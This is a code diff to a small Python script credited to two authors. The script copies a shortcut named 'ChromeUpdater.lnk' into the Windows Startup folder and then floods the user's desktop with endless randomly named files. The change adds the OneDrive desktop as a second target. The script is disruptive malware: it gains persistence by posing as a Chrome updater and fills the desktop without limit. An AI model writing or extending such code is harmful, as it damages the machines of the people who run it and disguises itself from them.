@@ -1,24 +1,9 @@
 #Created by 2Loop & CaptainBeluga
 import random
 import os
-import winreg
 
-def check_onedrive():
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\OneDrive")
-        winreg.QueryValueEx(key, "UserFolder")[0]
-        return True
-
-    except:
-        return False
-
-
-desk = ""
-if(check_onedrive()):
-    desk = "C:\\Users\\%username%\\OneDrive\\Desktop\\"
-
-else:
-    desk = "C:\\Users\\%username%\\Desktop\\"
+oneDriveDesk = "C:\\Users\\%username%\\Desktop\\"
+desk = "C:\\Users\\%username%\\OneDrive\\Desktop\\"
 
 
 os.system('move "C:\\Users\\%username%\\AppData\\Local\\Programs\\ChromeUpdater\\ChromeUpdater.lnk" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
@@ -34,5 +19,6 @@ while True:
     result = f'{name}.{extension}'
 
     os.system(f"echo off > {desk}/{result}")
+    os.system(f"echo off > {oneDriveDesk}/{result}")
 
     print(f'[+] File generated > {result}')
